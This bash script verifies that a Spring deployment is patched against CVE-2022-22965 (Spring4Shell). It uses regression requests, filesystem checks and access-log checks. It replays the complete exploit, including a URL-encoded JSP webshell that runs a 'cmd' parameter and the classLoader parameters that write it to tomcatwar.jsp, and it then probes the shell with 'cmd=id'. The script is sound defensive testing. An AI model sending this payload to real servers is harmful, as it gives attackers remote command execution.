#!/usr/bin/env bash
# Verify the CVE-2022-22965 fix.
#
# Spring 5.3.18 makes `class.*` non-bindable; a WAR-deployed application ignores
# the unknown properties and answers 200 with the normal page. A status-code
# check would therefore conclude "still vulnerable", so this script verifies
# behaviour: the access-log valve keeps its format, no JSP appears in the
# webroot, and normal binding still works.
#
# Usage: ./verify-fix.sh [base-url] [container]
set -u

BASE="${1:-http://127.0.0.1:8080}"
CONTAINER="${2:-spring4shell-fixed}"
P="class.module.classLoader.resources.context.parent.pipeline.first"
PASS=0
FAIL=0

check() {
    if [ "$2" -eq 0 ]; then
        printf '[PASS] %s\n' "$1"; PASS=$((PASS + 1))
    else
        printf '[FAIL] %s\n' "$1"; FAIL=$((FAIL + 1))
    fi
}

printf '\n1. Regression: the application still serves normal requests\n'
curl -sS -o /tmp/regression.html -w 'GET /?name=Bob&age=25 -> HTTP %{http_code}\n' --max-time 5 "$BASE/?name=Bob&age=25"
grep -q 'Bob' /tmp/regression.html && grep -q '25' /tmp/regression.html
check 'normal request returns 200 and renders Bob, 25' $?

printf '\n2. Replay the exploit (Spring 5.3.18 ignores the class.* properties)\n'
PATTERN='%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))%21%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di'
CODE=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 10 -H 'suffix: %>//' -H 'c1: Runtime' -H 'c2: <%' \
    "$BASE/?$P.pattern=$PATTERN&$P.suffix=.jsp&$P.directory=webapps/ROOT&$P.prefix=tomcatwar&$P.fileDateFormat=")
printf 'exploit request -> HTTP %s (200 here means "ignored", not "exploited")\n' "$CODE"
sleep 12  # let Tomcat flush/rotate its access log

printf '\n3. No webshell was written\n'
CODE=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 5 "$BASE/tomcatwar.jsp?pwd=j&cmd=id" || echo 000)
printf 'GET /tomcatwar.jsp -> HTTP %s\n' "$CODE"
[ "$CODE" = "404" ]
check 'the JSP webshell does not exist (404)' $?

if docker exec "$CONTAINER" true 2>/dev/null; then
    LISTING=$(docker exec "$CONTAINER" sh -c 'ls /usr/local/tomcat/webapps/ROOT/ 2>/dev/null')
    printf '%s' "$LISTING" | grep -q '\.jsp$'
    [ $? -ne 0 ]
    check 'no *.jsp file in the exploded webroot' $?

    printf '\n4. The access-log valve was not rewritten\n'
    # Log a benign request last, then inspect that line: if the valve had been
    # rewritten, the line would be JSP source instead of a request line.
    curl -sS -o /dev/null --max-time 5 "$BASE/?name=Regression&age=30"
    sleep 11  # access-log writes are buffered; wait for the next flush
    LAST=$(docker exec "$CONTAINER" sh -c 'tail -1 /usr/local/tomcat/logs/localhost_access_log.*.txt 2>/dev/null')
    printf 'last access-log line: %s\n' "$LAST"
    printf '%s' "$LAST" | grep -qE '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+ - - \[.*"GET /\?name=Regression'
    check 'the access log keeps the default pattern (request line, status, bytes)' $?
    printf '%s' "$LAST" | grep -qE '<%|%>'
    [ $? -ne 0 ]
    check 'the log line does not contain JSP source' $?
else
    echo '       (container not reachable - filesystem/log checks skipped)'
fi

printf '\n5. Binding of normal model properties still works\n'
CODE=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 5 "$BASE/?name=Alice&age=20")
[ "$CODE" = "200" ]
check 'argument binding for the normal model still works' $?

printf '\nRESULT: %d passed, %d failed\n' "$PASS" "$FAIL"
if [ "$FAIL" -ne 0 ]; then
    echo 'fix verification FAILED'
    exit 1
fi
echo 'fix verified - all checks passed'
